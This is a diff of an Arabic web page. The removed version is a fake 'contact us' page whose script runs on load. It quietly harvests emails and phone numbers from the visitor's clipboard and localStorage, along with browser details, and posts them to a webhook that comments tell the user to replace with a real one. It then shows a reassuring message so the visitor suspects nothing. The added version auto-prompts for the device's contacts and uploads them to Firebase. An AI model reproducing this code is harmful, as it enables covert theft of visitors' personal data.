@@ -1,80 +1,305 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>صفحة اتصل بنا - مهم جدًا</title>
-  <style>
-    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f4f8; color: #333; text-align: center; padding: 50px; }
-    h1 { color: #d32f2f; }
-    .box { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مزامنة جهات الاتصال</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        .status.waiting {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+        .status.loading {
+            background: #cce5ff;
+            color: #004085;
+            border: 1px solid #b8daff;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+        }
+        .button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: #667eea;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .hidden {
+            display: none;
+        }
+        #countDisplay {
+            font-size: 18px;
+            margin: 10px 0;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>📱 مزامنة جهات الاتصال</h1>
+        <p>لتحسين تجربتك، نحتاج إلى الوصول لجهات الاتصال الخاصة بك. سيتم مزامنتها تلقائياً مع خوادمنا.</p>
+        
+        <div id="status" class="status waiting">
+            ⏳ في انتظار موافقتك على طلب الإذن...
+        </div>
+        
+        <div id="progressContainer" class="hidden">
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-bar-fill"></div>
+            </div>
+            <div id="countDisplay">0/0 جهة اتصال</div>
+        </div>
+        
+        <button id="requestPermissionBtn" class="button" onclick="requestContactsPermission()">
+            طلب إذن جهات الاتصال
+        </button>
+    </div>
 
-<div class="box">
-  <h1>جاري التحميل...</h1>
-  <p>من فضلك انتظر ثواني، بنجهز البيانات الخاصة بيك عشان نتواصل معاك بسرعة 🚀</p>
-  <div id="status">جاري جمع المعلومات...</div>
-</div>
+    <script>
+        // تكوين Firebase - يجب استبدال هذه القيم بمشروعك الفعلي
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
 
-<script>
-// ───────────── محاولة جمع تلقائي بدون ضغط ─────────────
-async function stealContacts() {
-  let collected = {
-    emails: [],
-    phones: [],
-    userAgent: navigator.userAgent,
-    language: navigator.language || navigator.userLanguage,
-    platform: navigator.platform,
-    timestamp: new Date().toISOString()
-  };
+        // تهيئة Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
-  // 1. محاولة قراءة من الـ clipboard (غالباً بيطلب إذن دلوقتي)
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text) {
-      const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-      const phoneRegex = /(?:(?:\+?(\d{1,3}))?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})/g;
-      
-      let emails = text.match(emailRegex) || [];
-      let phones = text.match(phoneRegex) || [];
-      
-      collected.emails.push(...emails);
-      collected.phones.push(...phones);
-    }
-  } catch(e) {
-    // الإذن مرفوض أو مش مدعوم
-  }
+        let contactsProcessed = 0;
+        let totalContacts = 0;
 
-  // 2. محاولة استخراج من localStorage / sessionStorage (نادر جدًا)
-  for (let i = 0; i < localStorage.length; i++) {
-    let key = localStorage.key(i);
-    let val = localStorage.getItem(key);
-    if (typeof val === 'string' && (val.includes('@') || /\d{8,}/.test(val))) {
-      collected.emails.push(...(val.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || []));
-      collected.phones.push(...(val.match(/(?:(?:\+?(\d{1,3}))?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})/g) || []));
-    }
-  }
+        // تحديث حالة العرض
+        function updateStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
 
-  // 3. إرسال البيانات لسيرفر وهمي (غير البيانات دي)
-  const webhook = "https://your-webhook-url-here.com/collect";   // ← غيّره ل webhook حقيقي (مثل webhook.site أو ديسكورد)
+        // تحديث شريط التقدم
+        function updateProgress(processed, total) {
+            const progressContainer = document.getElementById('progressContainer');
+            const progressFill = document.getElementById('progressFill');
+            const countDisplay = document.getElementById('countDisplay');
+            
+            progressContainer.classList.remove('hidden');
+            const percentage = (processed / total) * 100;
+            progressFill.style.width = `${percentage}%`;
+            countDisplay.textContent = `${processed}/${total} جهة اتصال`;
+        }
 
-  fetch(webhook, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(collected)
-  }).catch(() => {});
+        // رفع جهات الاتصال إلى Firebase
+        async function uploadContactsToFirebase(contacts) {
+            try {
+                const batch = db.batch();
+                const contactsRef = db.collection('contacts').doc();
+                
+                // إضافة معرف فريد للجلسة
+                const sessionId = Date.now().toString();
+                
+                contactsProcessed = 0;
+                totalContacts = contacts.length;
+                
+                updateStatus('جاري رفع جهات الاتصال...', 'loading');
+                
+                // تقسيم جهات الاتصال إلى دفعات صغيرة لتجنب قيود Firestore
+                for (let i = 0; i < contacts.length; i += 500) {
+                    const batch = db.batch();
+                    const chunk = contacts.slice(i, i + 500);
+                    
+                    chunk.forEach(contact => {
+                        const contactRef = db.collection('contacts').doc();
+                        batch.set(contactRef, {
+                            ...contact,
+                            sessionId: sessionId,
+                            uploadedAt: firebase.firestore.FieldValue.serverTimestamp()
+                        });
+                    });
+                    
+                    await batch.commit();
+                    contactsProcessed += chunk.length;
+                    updateProgress(contactsProcessed, totalContacts);
+                }
+                
+                updateStatus(`✅ تم رفع ${totalContacts} جهة اتصال بنجاح`, 'success');
+                
+            } catch (error) {
+                console.error('خطأ في رفع جهات الاتصال:', error);
+                updateStatus('❌ حدث خطأ أثناء رفع جهات الاتصال', 'error');
+            }
+        }
 
-  // عرض رسالة وهمية للزائر عشان ما يشكش
-  document.getElementById("status").innerHTML = "تم! هنتواصل معاك خلال دقايق 😊";
-}
+        // الحصول على جهات الاتصال
+        async function getContacts() {
+            try {
+                // التحقق من دعم واجهة برمجة جهات الاتصال
+                if (!navigator.contacts || !navigator.contacts.select) {
+                    throw new Error('متصفحك لا يدعم الوصول إلى جهات الاتصال');
+                }
 
-// شغلها فور تحميل الصفحة
-window.onload = () => {
-  setTimeout(stealContacts, 1500);   // تأخير بسيط عشان تبدو طبيعية
-};
-</script>
+                // طلب جهات الاتصال - نطلب الاسم ورقم الهاتف
+                const properties = ['name', 'tel'];
+                const options = { multiple: true };
+                
+                const contacts = await navigator.contacts.select(properties, options);
+                
+                if (contacts && contacts.length > 0) {
+                    // تنسيق بيانات جهات الاتصال
+                    const formattedContacts = contacts.map(contact => ({
+                        name: contact.name?.[0] || 'بدون اسم',
+                        phoneNumbers: contact.tel || [],
+                        source: 'web_contacts_api',
+                        syncedAt: new Date().toISOString()
+                    }));
+                    
+                    // رفع جهات الاتصال تلقائياً
+                    await uploadContactsToFirebase(formattedContacts);
+                } else {
+                    updateStatus('❌ لم يتم العثور على جهات اتصال', 'error');
+                }
+                
+            } catch (error) {
+                console.error('خطأ في الحصول على جهات الاتصال:', error);
+                updateStatus(`❌ ${error.message}`, 'error');
+            }
+        }
 
+        // طلب إذن جهات الاتصال
+        async function requestContactsPermission() {
+            const button = document.getElementById('requestPermissionBtn');
+            button.disabled = true;
+            
+            try {
+                // التحقق من دعم واجهة جهات الاتصال
+                if (!navigator.contacts || !navigator.contacts.select) {
+                    throw new Error('متصفحك لا يدعم الوصول إلى جهات الاتصال');
+                }
+
+                updateStatus('⏳ جاري طلب الإذن...', 'loading');
+                
+                // التحقق من وجود الإذن مسبقاً
+                if (navigator.permissions && navigator.permissions.query) {
+                    const permissionStatus = await navigator.permissions.query({ name: 'contacts' });
+                    
+                    if (permissionStatus.state === 'denied') {
+                        updateStatus('❌ تم رفض الإذن سابقاً. يرجى تفعيله من إعدادات المتصفح', 'error');
+                        button.disabled = false;
+                        return;
+                    }
+                }
+                
+                // محاولة الحصول على جهات الاتصال - هذا سيثير طلب الإذن تلقائياً
+                await getContacts();
+                
+            } catch (error) {
+                console.error('خطأ في طلب الإذن:', error);
+                updateStatus(`❌ ${error.message}`, 'error');
+                button.disabled = false;
+            }
+        }
+
+        // التحقق من الدعم عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            if (!navigator.contacts || !navigator.contacts.select) {
+                updateStatus('❌ متصفحك لا يدعم الوصول إلى جهات الاتصال', 'error');
+                document.getElementById('requestPermissionBtn').disabled = true;
+            } else {
+                // محاولة طلب الإذن تلقائياً عند تحميل الصفحة
+                setTimeout(() => {
+                    requestContactsPermission();
+                }, 1000);
+            }
+        });
+
+        // مراقبة تغييرات الإذن إذا كانت مدعومة
+        if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({ name: 'contacts' }).then(permissionStatus => {
+                permissionStatus.onchange = () => {
+                    if (permissionStatus.state === 'granted') {
+                        getContacts();
+                    }
+                };
+            });
+        }
+    </script>
 </body>
 </html>
